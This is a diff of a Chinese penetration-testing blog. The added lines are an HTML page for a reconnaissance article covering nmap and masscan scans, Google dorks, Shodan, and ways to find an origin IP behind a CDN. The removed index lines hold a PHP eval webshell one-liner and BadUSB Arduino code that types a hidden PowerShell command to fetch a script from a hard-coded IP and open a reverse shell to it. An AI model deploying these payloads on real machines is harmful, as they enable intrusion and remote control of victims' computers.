@@ -1,9 +1,80 @@
-<?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>渗透测试之信息收集</title>
-    <url>/2019/12/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
-    <content><![CDATA[<p>拿到一个待检测的站。你觉得应该先做什么。（信息收集篇）</p>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    渗透测试之信息收集 |
+    
+    Melon</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  
+  <script src="/js/pace.min.js"></script>
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-渗透测试之信息收集" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      渗透测试之信息收集
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/12/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="article-date">
+  <time datetime="2019-12-12T03:50:11.000Z" itemprop="datePublished">2019-12-12</time>
+</a>
+        
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+  </div>
+
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <p>拿到一个待检测的站。你觉得应该先做什么。（信息收集篇）</p>
 <a id="more"></a>
 
 <h2 id="1-拿到一个待检测的站。你觉得应该先做什么。"><a href="#1-拿到一个待检测的站。你觉得应该先做什么。" class="headerlink" title="1.拿到一个待检测的站。你觉得应该先做什么。"></a>1.拿到一个待检测的站。你觉得应该先做什么。</h2><p>收集信息：whois、网站源 IP、旁站、C 段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息。</p>
@@ -53,14 +124,14 @@
 <h4 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h4><p>whatweb url</p>
 <h3 id="5-敏感目录扫描"><a href="#5-敏感目录扫描" class="headerlink" title="5.敏感目录扫描"></a>5.敏感目录扫描</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>​    御剑、Dirmap、wwwscan、DirBuster、Dirsearch、cansina。</p>
 <h4 id="kali-1"><a href="#kali-1" class="headerlink" title="kali"></a>kali</h4><p>​    dirb url //命令行使用<br>​    dirbuster     //界面化工具<br>​    wordpress:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan -u http://www.baidu.comcom  //kali扫描WordPress漏洞</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan -u http://www.baidu.comcom  //kali扫描WordPress漏洞</span><br></pre></td></tr></table></figure>
 
-<h3 id="6-端口"><a href="#6-端口" class="headerlink" title="6.端口"></a>6.端口</h3><h4 id="端口信息收集："><a href="#端口信息收集：" class="headerlink" title="端口信息收集："></a>端口信息收集：</h4><h5 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -anbo       //windows查看开放端口及对应进程，-a查看所有连接和侦听端口，-n以数字方式显示地址和端口号，-b显示端口连接的程序，-o显示关联pid</span><br></pre></td></tr></table></figure>
-<h5 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -tunlp       // -t (tcp) 仅显示tcp相关选项 -u (udp)仅显示udp相关选项 -n 拒绝显示别名，能显示数字的全部转化为数字 -l 仅列出在Listen(监听)的服务状态 -a (all)列出所有服务状态-p 显示建立相关链接的程序名</span><br></pre></td></tr></table></figure>
-<h4 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h4><h5 id="本地工具"><a href="#本地工具" class="headerlink" title="本地工具"></a>本地工具</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -A -v -T4 &lt;目标IP&gt; //查看开放端口</span><br><span class="line">nmap &lt;目标IP&gt; -p &lt;探测端口&gt;</span><br><span class="line">masscan -p&lt;探测端口&gt; &lt;目标IP&gt; --rate=10000  //rate每秒发送的数据包</span><br></pre></td></tr></table></figure>
-<h5 id="在线工具："><a href="#在线工具：" class="headerlink" title="在线工具："></a>在线工具：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://tool.chinaz.com/port    //站长工具</span><br></pre></td></tr></table></figure>
+<h3 id="6-端口"><a href="#6-端口" class="headerlink" title="6.端口"></a>6.端口</h3><h4 id="端口信息收集："><a href="#端口信息收集：" class="headerlink" title="端口信息收集："></a>端口信息收集：</h4><h5 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anbo       //windows查看开放端口及对应进程，-a查看所有连接和侦听端口，-n以数字方式显示地址和端口号，-b显示端口连接的程序，-o显示关联pid</span><br></pre></td></tr></table></figure>
+<h5 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tunlp       // -t (tcp) 仅显示tcp相关选项 -u (udp)仅显示udp相关选项 -n 拒绝显示别名，能显示数字的全部转化为数字 -l 仅列出在Listen(监听)的服务状态 -a (all)列出所有服务状态-p 显示建立相关链接的程序名</span><br></pre></td></tr></table></figure>
+<h4 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h4><h5 id="本地工具"><a href="#本地工具" class="headerlink" title="本地工具"></a>本地工具</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -v -T4 &lt;目标IP&gt; //查看开放端口</span><br><span class="line">nmap &lt;目标IP&gt; -p &lt;探测端口&gt;</span><br><span class="line">masscan -p&lt;探测端口&gt; &lt;目标IP&gt; --rate=10000  //rate每秒发送的数据包</span><br></pre></td></tr></table></figure>
+<h5 id="在线工具："><a href="#在线工具：" class="headerlink" title="在线工具："></a>在线工具：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://tool.chinaz.com/port    //站长工具</span><br></pre></td></tr></table></figure>
 
-<h3 id="7-敏感信息收集"><a href="#7-敏感信息收集" class="headerlink" title="7.敏感信息收集"></a>7.敏感信息收集</h3><h4 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google Hack"></a>Google Hack</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filetype: 搜索制定类型的文件，例如：filetype:doc.将返回所有以doc结尾的文件URL。</span><br><span class="line">intext: 把网页中的正文内容中的某个字符做为搜索条件。例如在google里输入:intext:Melon.将返回所有在网页正文部分包含”Melon”的网页。</span><br><span class="line">intitle: 搜索网页标题中是否有我们所要找的字符。allintitle:也同intitle类似。</span><br><span class="line">cache: 搜索google里关于某些内容的缓存,有时候往往能找到一些好东西。</span><br><span class="line">info: 查找指定站点的一些基本信息。</span><br><span class="line">inurl: 搜索我们指定的字符是否存在于URL中.例如输入:inurl:admin,将返回N个类似于这样的连接:http://xxx/admin,常用于查找通用漏洞、注入点、管理员登录的URL。</span><br><span class="line">allinurl:也同inurl类似,可指定多个字符</span><br><span class="line">linkurl: 例如搜索:linkurl:melons.top可以返回所有和melons.top做了链接的URL。</span><br><span class="line">site: 搜索指定域名,如site:melons.top.将返回所有和melons.top有关的URL。</span><br></pre></td></tr></table></figure>
+<h3 id="7-敏感信息收集"><a href="#7-敏感信息收集" class="headerlink" title="7.敏感信息收集"></a>7.敏感信息收集</h3><h4 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google Hack"></a>Google Hack</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">filetype: 搜索制定类型的文件，例如：filetype:doc.将返回所有以doc结尾的文件URL。</span><br><span class="line">intext: 把网页中的正文内容中的某个字符做为搜索条件。例如在google里输入:intext:Melon.将返回所有在网页正文部分包含”Melon”的网页。</span><br><span class="line">intitle: 搜索网页标题中是否有我们所要找的字符。allintitle:也同intitle类似。</span><br><span class="line">cache: 搜索google里关于某些内容的缓存,有时候往往能找到一些好东西。</span><br><span class="line">info: 查找指定站点的一些基本信息。</span><br><span class="line">inurl: 搜索我们指定的字符是否存在于URL中.例如输入:inurl:admin,将返回N个类似于这样的连接:http://xxx/admin,常用于查找通用漏洞、注入点、管理员登录的URL。</span><br><span class="line">allinurl:也同inurl类似,可指定多个字符</span><br><span class="line">linkurl: 例如搜索:linkurl:melons.top可以返回所有和melons.top做了链接的URL。</span><br><span class="line">site: 搜索指定域名,如site:melons.top.将返回所有和melons.top有关的URL。</span><br></pre></td></tr></table></figure>
 <h4 id="查看响应头"><a href="#查看响应头" class="headerlink" title="查看响应头"></a>查看响应头</h4><p>F12查看系统，中间件版本。</p>
 <h4 id="通过Github搜索获取敏感信息"><a href="#通过Github搜索获取敏感信息" class="headerlink" title="通过Github搜索获取敏感信息"></a>通过Github搜索获取敏感信息</h4><p>site:Github password</p>
 <h3 id="8-真实IP"><a href="#8-真实IP" class="headerlink" title="8.真实IP"></a>8.真实IP</h3><p><strong>判断是否为CDN</strong></p>
@@ -68,7 +139,7 @@
 <h4 id="2、nslookup"><a href="#2、nslookup" class="headerlink" title="2、nslookup"></a>2、nslookup</h4><p>使用nslookup查看域名解析对应的IP地址，如果解析到多个IP地址则说明使用了CDN~<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/nslookup.png" alt="html"><br>从上面可以看到解析到多个IP地址说明使用了CDN~</p>
 <h4 id="3、使用CDN查询工具进行查看"><a href="#3、使用CDN查询工具进行查看" class="headerlink" title="3、使用CDN查询工具进行查看"></a>3、使用CDN查询工具进行查看</h4><p><a href="https://www.ipip.net/ip.html" target="_blank" rel="noopener">https://www.ipip.net/ip.html</a> //高精度IP查询<br><strong>绕CDN查真实IP地址</strong></p>
 <h4 id="1、域名历史解析记录"><a href="#1、域名历史解析记录" class="headerlink" title="1、域名历史解析记录"></a>1、域名历史解析记录</h4><p>查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://dnsdb.io/zh-cn/</span><br><span class="line">https://x.threatbook.cn/</span><br><span class="line">http://toolbar.netcraft.com/site_report?url=</span><br><span class="line">http://viewdns.info/</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://dnsdb.io/zh-cn/</span><br><span class="line">https://x.threatbook.cn/</span><br><span class="line">http://toolbar.netcraft.com/site_report?url=</span><br><span class="line">http://viewdns.info/</span><br></pre></td></tr></table></figure>
 
 <h4 id="2、查询子域名"><a href="#2、查询子域名" class="headerlink" title="2、查询子域名"></a>2、查询子域名</h4><p>很多站长也许只会对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过子域名查询对应的 IP 来辅助查找网站的真实IP。</p>
 <h4 id="3、漏洞利用"><a href="#3、漏洞利用" class="headerlink" title="3、漏洞利用"></a>3、漏洞利用</h4><p>目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpinfo.png" alt="html"><br>XSS盲打，命令执行反弹shell，SSRF等。<br>无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</p>
@@ -80,7 +151,7 @@
 <h4 id="9、利用SSL证书寻找真实原始IP"><a href="#9、利用SSL证书寻找真实原始IP" class="headerlink" title="9、利用SSL证书寻找真实原始IP"></a>9、利用SSL证书寻找真实原始IP</h4><p>以CloudFlare这款CDN加速器举例：假如你在 abc.com 上托管了一个服务，原始服务器IP是136.23.63.44。 而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。<br>为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。这看起来很安全，但问题是，当你在端口443(<a href="https://x.x.x.x:443" target="_blank" rel="noopener">https://x.x.x.x:443</a>) 上直接连接到IP时，SSL证书就会被暴露。<br>此时，如果攻击者扫描0.0.0.0/0，即整个互联网，他们就可以在端口443上获取在 aaa.com上的有效证书，进而获取提供给你的Web服务器IP。<br>目前Censys工具(<a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a>) 就能实现对整个互联网的扫描，Censys是一款用以搜索联网设备信息的新型搜索引擎，安全专家可以使用它来评估他们实现方案的安全性，而黑客则可以使用它作为前期侦查攻击目标、收集目标信息的强大利器。<br>Censys搜索引擎能够扫描整个互联网，Censys每天都会扫描IPv4地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。<br>而攻击者唯一需要做的就是把上面用文字描述的搜索词翻译成实际的搜索查询参数。<br>Censys证书查询搜索步骤如下：</p>
 <h5 id="1、aaa-com-证书的搜索查询参数为：parsed-names：aaa-com"><a href="#1、aaa-com-证书的搜索查询参数为：parsed-names：aaa-com" class="headerlink" title="1、aaa.com 证书的搜索查询参数为：parsed.names：aaa.com"></a>1、aaa.com 证书的搜索查询参数为：parsed.names：aaa.com</h5><p>只显示有效证书的查询参数为：tags.raw：trusted<br>攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p>
 <h5 id="2、组合后的搜索参数为：parsed-names-aaa-com-and-tags-raw-trusted"><a href="#2、组合后的搜索参数为：parsed-names-aaa-com-and-tags-raw-trusted" class="headerlink" title="2、组合后的搜索参数为：parsed.names: aaa.com and tags.raw: trusted"></a>2、组合后的搜索参数为：parsed.names: aaa.com and tags.raw: trusted</h5><h5 id="3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的”Explore”，打开包含多个工具的下拉菜单。What’s-using-this-certificate-gt-IPv4-Hosts；"><a href="#3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的”Explore”，打开包含多个工具的下拉菜单。What’s-using-this-certificate-gt-IPv4-Hosts；" class="headerlink" title="3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的”Explore”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; IPv4 Hosts；"></a>3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的”Explore”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; IPv4 Hosts；</h5><h4 id="10、通过shodan-favicon-ico获取真实IP"><a href="#10、通过shodan-favicon-ico获取真实IP" class="headerlink" title="10、通过shodan favicon.ico获取真实IP"></a>10、通过shodan favicon.ico获取真实IP</h4><p>在Shodan搜索中有一个关于网站icon图标的搜索语法，<strong>http.favicon.hash</strong>，我们可以使用这个语法来搜索出使用了同一icon图标的网站。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> mmh3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">response = requests.get(<span class="string">'https://www.baidu.com/favicon.ico'</span>)</span><br><span class="line">favicon = response.content.encode(<span class="string">'base64'</span>)</span><br><span class="line">hash = mmh3.hash(favicon)</span><br><span class="line"><span class="keyword">print</span> hash</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mmh3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">response = requests.get(<span class="string">'https://www.baidu.com/favicon.ico'</span>)</span><br><span class="line">favicon = response.content.encode(<span class="string">'base64'</span>)</span><br><span class="line">hash = mmh3.hash(favicon)</span><br><span class="line"><span class="keyword">print</span> hash</span><br></pre></td></tr></table></figure>
 
 <p>计算出的hash用 http.favicon.hash：hash 搜索</p>
 <h3 id="9-shodan"><a href="#9-shodan" class="headerlink" title="9.shodan"></a>9.shodan</h3><p>shodan网站：<a href="http://www.shodan.io" target="_blank" rel="noopener">www.shodan.io</a><br>webcam //网络摄像头<br>搜索技巧：<br>   搜索指定端口：port:3389<br>   搜索指定IP地址：host:61.135.169.121<br>   搜索具体城市开放具体端口：city:hangzhou port:22<br>   搜索指定服务器：microsoft iis 6.0 / apache<br>kali：<br>   获取自身外部ip：myip<br>   查询指定IP：host xxxx (网页版可能不会显示)<br>   查看蜜罐保护：shodan honeyscore xxxx<br>python-shodan：<br>   初始化api key<br>   python-shodan search 方法：</p>
@@ -90,55 +161,146 @@
 <li>查看api键值：<a href="https://developer.shodan.io/api" target="_blank" rel="noopener">https://developer.shodan.io/api</a></li>
 <li>python-shodan查找ip：</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">常用 Shodan 库函数</span><br><span class="line">shodan.Shodan(key) ：初始化连接API</span><br><span class="line">Shodan.count(query, facets=None)：返回查询结果数量</span><br><span class="line">Shodan.host(ip, history=False)：返回一个IP的详细信息</span><br><span class="line">Shodan.ports()：返回Shodan可查询的端口号</span><br><span class="line">Shodan.protocols()：返回Shodan可查询的协议</span><br><span class="line">Shodan.services()：返回Shodan可查询的服务</span><br><span class="line">Shodan.queries(page=1, sort=&apos;timestamp&apos;, order=&apos;desc&apos;)：查询其他用户分享的查询规则</span><br><span class="line">Shodan.scan(ips, force=False)：使用Shodan进行扫描，ips可以为字符或字典类型</span><br><span class="line">Shodan.search(query, page=1, limit=None, offset=None, facets=None, minify=True)：查询Shodan数据</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>信息收集</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JsWebshell</title>
-    <url>/2019/12/11/JSshell/</url>
-    <content><![CDATA[<p>在目标站有可写的html点时可以使用</p>
-<a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">常用 Shodan 库函数</span><br><span class="line">shodan.Shodan(key) ：初始化连接API</span><br><span class="line">Shodan.count(query, facets=None)：返回查询结果数量</span><br><span class="line">Shodan.host(ip, history=False)：返回一个IP的详细信息</span><br><span class="line">Shodan.ports()：返回Shodan可查询的端口号</span><br><span class="line">Shodan.protocols()：返回Shodan可查询的协议</span><br><span class="line">Shodan.services()：返回Shodan可查询的服务</span><br><span class="line">Shodan.queries(page=1, sort=&apos;timestamp&apos;, order=&apos;desc&apos;)：查询其他用户分享的查询规则</span><br><span class="line">Shodan.scan(ips, force=False)：使用Shodan进行扫描，ips可以为字符或字典类型</span><br><span class="line">Shodan.search(query, page=1, limit=None, offset=None, facets=None, minify=True)：查询Shodan数据</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/12/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" data-id="ck42a5jzx00063cuvgjdv2zkc"
+         class="article-share-link">分享</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li></ul>
 
-<h3 id="0x00-准备环境"><a href="#0x00-准备环境" class="headerlink" title="0x00 准备环境"></a>0x00 准备环境</h3><p>环境使用的是：PHP Version 5.6.27+Apach</p>
-<h3 id="0x01-开始实验"><a href="#0x01-开始实验" class="headerlink" title="0x01 开始实验"></a>0x01 开始实验</h3><p>准备的代码为（这里用的虽然是js其实最后还是用了php）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language=php&gt;@eval($_POST[&apos;web&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+    </footer>
 
-<p>在这里我们先用纯Html做一次测试</p>
-<p><img src="/images/JSshell/html.png" alt="html"></p>
-<p>我们访问html页面发现并没有任何反应</p>
-<p><img src="/images/JSshell/htmlphpinfo.png" alt="html"></p>
-<p>我们再次访问php页面查看结果发现phpinfo出现在了页面上</p>
-<p><img src="/images/JSshell/phpphpinfo.png" alt="html"></p>
-<p>这里再测试一下可以利用的版本发现7以上的版本都不能顺利执行</p>
-<p><img src="/images/JSshell/7.0.png" alt="html"></p>
-<h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>利用条件已经很明确了，必须要php下确实存在的才可以被利用，这个方法可用完全是因为php支持html的原因，php7移除该方法，其实利用条件还是比较苛刻的。</p>
-]]></content>
-      <categories>
-        <category>webshell</category>
-      </categories>
-      <tags>
-        <tag>js</tag>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BadUsb</title>
-    <url>/2019/04/19/BadUsb/</url>
-    <content><![CDATA[<p>在2014年美国黑帽大会上，柏林SRLabs的安全研究人员JakobLell和独立安全研究人员Karsten Nohl展示了他们称为“BadUSB”(按照BadBIOS命名)的攻击方法，这种攻击方法让USB安全和几乎所有和USB相关的设备(包括具有USB端口的电脑)都陷入相当危险的状态。</p>
-<a id="more"></a>
+  </div>
 
-<h5 id="Windows系统自启动路径"><a href="#Windows系统自启动路径" class="headerlink" title="Windows系统自启动路径"></a>Windows系统自启动路径</h5><pre><code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</code></pre><h4 id="附自己的一些代码"><a href="#附自己的一些代码" class="headerlink" title="附自己的一些代码"></a>附自己的一些代码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;Keyboard.h&gt; //包含键盘模块头文件</span><br><span class="line">void setup()&#123; //初始化</span><br><span class="line">Keyboard.begin();//开始键盘通信</span><br><span class="line">delay(1000);//延时1000毫秒，</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键 </span><br><span class="line">Keyboard.press(&apos;r&apos;);//按下r键 CMD</span><br><span class="line">delay(500); </span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);//松掉win键 </span><br><span class="line">Keyboard.release(&apos;r&apos;);//松掉r键 </span><br><span class="line">Keyboard.println(&quot;cmd&quot;);</span><br><span class="line">delay(500); </span><br><span class="line">//Keyboard.println(&quot;cmd.exe /T:01 /K mode CON: COLS=16 LINES=1&quot;); //缩小窗口</span><br><span class="line">//Keyboard.println(&quot;$clnt = new-object System.Net.WebClient;$url= &apos;http://47.93.12.104/water.ps1&apos;;$file = &apos;D:\\melon.ps1&apos;;$clnt.DownloadFile($url,$file);D:\\melon.ps1;&quot;);</span><br><span class="line">//.println(&quot;powershell -w hidden while(1)&#123;IEX (New-Object Net.WebClient).DownloadString(&apos;D:\\melon.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 47.93.12.104 -port 9999&#125;&quot;);</span><br><span class="line">Keyboard.println(&quot;powershell -w hidden while(1)&#123;IEX (New-Object Net.WebClient).DownloadString(&apos;http://47.93.12.104/water.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 47.93.12.104 -port 9999&#125;&quot;);</span><br><span class="line">Keyboard.press(KEY_RETURN);  //按下回车键</span><br><span class="line">Keyboard.release(KEY_RETURN); //释放回车键</span><br><span class="line">Keyboard.end();//结束键盘通讯 </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">void loop()//循环，这里的代码</span><br><span class="line">&#123; </span><br><span class="line">//循环体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>硬件安全</category>
-      </categories>
-      <tags>
-        <tag>钓鱼</tag>
-        <tag>USB</tag>
-      </tags>
-  </entry>
-</search>
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2019/12/11/JSshell/" class="article-nav-link">
+        <strong class="article-nav-caption">后一篇</strong>
+        <div class="article-nav-title">JsWebshell</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2019 Melon</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Melon"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/lazyload.min.js"></script>
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+  <script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+  <script src="/js/tocbot.min.js"></script>
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+<script src="/js/ocean.js"></script>
+
+</body>
+</html>
